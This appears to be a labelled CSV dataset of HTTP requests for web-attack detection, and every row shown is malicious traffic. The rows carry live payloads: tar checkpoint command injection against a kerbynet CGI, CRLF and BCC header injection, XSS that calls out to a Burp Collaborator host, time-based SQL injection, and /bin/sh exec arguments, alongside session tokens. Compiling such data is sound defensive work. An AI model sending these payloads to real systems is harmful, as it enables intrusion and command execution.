id,method,user_agent,url,refer,body,lable
1225,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",/?arg=-n&arg=home360&arg=logstash-760-el7-appapi-8e96ca-5f7b678489-4hzl8&arg=-c&arg=logstash-760-el7-appapi&arg=env&arg=COLUMNS=1280&arg=LINES=720&arg=/bin/sh&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTc3MTE4MjgsImlzcyI6IjEyMDAwNjI5NzUifQ.a90VkeQYicYM1ghixSQkuk11hLCllUHsruDTl7lvjXc,,,4
922,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20896533501%20%2b%20818633303%22%0A%27,,,4
1441,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/api/operationList?id=23&name=%250d%250aCRLF-Header%3ACRLF-Value&notRead=false&pageIndex=1&pageSize=10,http://pre.zypt.360zqaq.net/projectDetails/33,,4
323,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/suports/socket.io/?EIO=4%3e%0d%0aBCC%3afud554zmqi4nqawhnjs9kqees5y1mscg4as1fr3g@burpcollaborator.net%0d%0acqf%3a%20y&transport=polling&t=N-7XONw,http://121.4.111.58:3000/suports,"GET /suports/socket.io/?EIO=4%3e%0d%0aBCC%3afud554zmqi4nqawhnjs9kqees5y1mscg4as1fr3g@burpcollaborator.net%0d%0acqf%3a%20y&transport=polling&t=N-7XONw HTTP/1.1 Host: 121.4.111.58:3000 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/suports Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",4
215,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/536veu8cz8ddz057w91ztgn41v7svujmaa7xylnX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_macos_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/536veu8cz8ddz057w91ztgn41v7svujmaa7xylnX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_macos_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",4
717,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE",/?arg=-n&arg=smart-iot-ws&arg=core-59cbdd-56774fb4c-48sgt&arg=-c&arg=smartiot-online&arg=env&arg=COLUMNS=1440&arg=LINES=900&arg=/bin/sh&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTg4MTkxMjksImlzcyI6IjEyMDAwNTY3MjUifQ.jWJWjfgf0t6VrJa60WdB3Ms660FPqF_vCh-LHTqkoCg,,,4
928,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/js/main.899d901d1938944eee24.js,http://124.70.151.147:9180/,"GET /user/avatar/ HTTP/1.1 Referer: https://www.google.com/search?hl=en&q=testing'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||' User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c X-Requested-With: XMLHttpRequest Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Host: 124.70.151.147:9180 Connection: Keep-alive  GET /ZUs1WHJWMkph/assets/js/main.38d31685fde2db7ba816.js HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /qyswebapp/%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs/js/main.899d901d1938944eee24.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
802,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/vendors~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs.js,http://124.70.151.147:9180/,"GET /assets/js/vendors~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1120,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~500~appoint~auth~detail~identify~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.967292fd97008e6eb1ac.js,http://124.70.151.147:9180/,"GET /assets/js/default~500~appoint~auth~detail~identify~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1146,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0,/docs%0d%0aBCC%3ayz14hx9uw6c4row04okgyqyktbz4n7bz4n1aryg@burpcollaborator.net%0d%0ajzf%3a%20p/developers.html,http://10.19.159.19:1001/docs/,,4
